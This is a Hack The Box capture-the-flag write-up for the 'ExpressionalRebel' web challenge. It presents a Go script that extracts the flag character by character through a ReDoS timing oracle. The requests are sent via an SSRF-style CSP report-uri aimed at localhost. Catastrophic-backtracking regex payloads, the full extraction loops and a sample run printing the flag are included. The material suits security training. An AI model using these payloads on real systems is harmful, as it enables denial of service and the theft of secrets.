# Hack The Box. Challenges. Web. ExpressionalRebel

Challenge write-up: https://7rocky.github.io/en/ctf/htb-challenges/web/expressionalrebel

### `redos.go`

This script is made to extract the flag character by character using ReDoS. We have an time-based oracle to know if a certain character is correct or not.

Basically, the server allows us to enter a Regular Expression (RegEx) that will be tested agains the flag. We can try characters so that if the character is wrong, the RegEx algorithm finishes quickly and if it is right it takes a long time.

The server uses a Node.js module called [`time-limited-regular-expressions`](https://www.npmjs.com/package/time-limited-regular-expressions) to limit the execution time to 2 seconds.

There is also a Server-Side Request Forgery attack, but it will not be explained here (take a look at the [write-up](https://7rocky.github.io/en/ctf/htb-challenges/web/expressionalrebel) for more information).

We have the following proof of concept (using the test flag: `HTB{f4k3_fl4g_f0r_t3st1ng}`):

- Sending `^HTB\{f((((((.)*)*)*)*)*)*!"}` as RegEx returns a response in 2,04 seconds.
- Sending `^HTB\{a((((((.)*)*)*)*)*)*!"}` as RegEx returns a response in 0,04 seconds.

With this fact we can extract a part of the flag (called `frontflag`):

```go
frontflag := ""
matched := true

for matched {
  matched = false

  for _, c := range CHARS {
    testPayload := fmt.Sprintf(`{"csp": "report-uri http://0x7f000001:1337/deactivate?secretCode=^HTB\\{%s(((((((.)*)*)*)*)*)*)*!"}`, frontflag+string(c))

    if postDuration(testPayload) >= 2000 {
      frontflag += string(c)
      fmt.Printf("Frontflag: HTB{%s\r", frontflag)
      matched = true
      break
    }
  }

  if strings.HasSuffix(frontflag, "__") {
    frontflag = frontflag[:len(frontflag)-2]
    break
  }
}

fmt.Printf("[+] Frontflag: HTB{%s\n", frontflag)
```

Where `postDuration` performs a POST request and returns the response time in milliseconds:

```go
var httpClient = &http.Client{}

func postDuration(testPayload string) int64 {
	jsonData := []byte(testPayload)

	req, _ := http.NewRequest("POST", "http://"+host+"/api/evaluate", bytes.NewBuffer(jsonData))

	req.Header.Set("Content-Type", "application/json")

	t := time.Now()
	_, err := httpClient.Do(req)

	if err != nil {
		panic(err)
	}

	return time.Since(t).Milliseconds()
}
```

We continue adding characters to the flag until no more characters are correctly detected (if there is a match with two sequential underscores).

It is not possible to extract the complete flag with this method, so we need to extract the flag from right to left as well. Here we have another proof of concept:

- Sending `^HTB\{.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?[^g]\}$` as RegEx returns a response in 2,04 seconds.
- Sending `^HTB\{.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?[^a]\}$` as RegEx returns a response in 0,04 seconds.

And thus we have a similar method to extract the rest of the flag (called `backflag`):

```go
backflag := ""
matched = true

for matched {
  matched = false

  for _, c := range CHARS {
    testPayload := fmt.Sprintf(`{"csp": "report-uri http://0x7f000001:1337/deactivate?secretCode=^HTB\\{%s[^%s]%s\\}$"}`, strings.Repeat(".?", 50-len(backflag)), string(c), backflag)

    if postDuration(testPayload) >= 2000 {
      backflag = string(c) + backflag
      fmt.Printf("Backflag: %s}\r", backflag)
      matched = true
      break
    }
  }

  if strings.HasPrefix(backflag, "__") {
    backflag = backflag[2:]
    break
  }
}

fmt.Printf("[+] Backflag: %s}\n", backflag)
```

Finally, there is a function called `joinFlags` to merge both results in a unique one if possible:

```go
func joinFlags(frontflag, backflag string) {
	i := 1

	for ; strings.Index(frontflag, backflag[:i]) != -1; i++ {
	}

	i--

	if !strings.HasSuffix(frontflag, backflag[:i]) {
		fmt.Println("[*] Could not find a match between frontflag and backflag")
		fmt.Printf("[!] Possible flag: HTB{%s%s}\n", frontflag, backflag)
		fmt.Printf("[!] Possible flag: HTB{%s_%s}\n", frontflag, backflag)
		fmt.Printf("[!] Flag results: HTB{%s ...\n%s... %s}\n", frontflag, strings.Repeat(" ", 23+len(frontflag)), backflag)
	} else {
		fmt.Println("[*] Found a match between frontflag and backflag")
		index := strings.Index(frontflag, backflag[:i])
		flag := "HTB{" + frontflag[:index] + backflag + "}"
		fmt.Println("[!] Flag:", flag)
	}
}
```

This is an example of execution:

```console
$ go run redos.go 167.99.202.131:31069
[+] Frontflag: HTB{b4cKtR4ck1ng_4Nd_P4rs3Rs_4r
[+] Backflag: ck1ng_4Nd_P4rs3Rs_4r3_fuNnY}
[*] Found a match between frontflag and backflag
[!] Flag: HTB{b4cKtR4ck1ng_4Nd_P4rs3Rs_4r3_fuNnY}
```
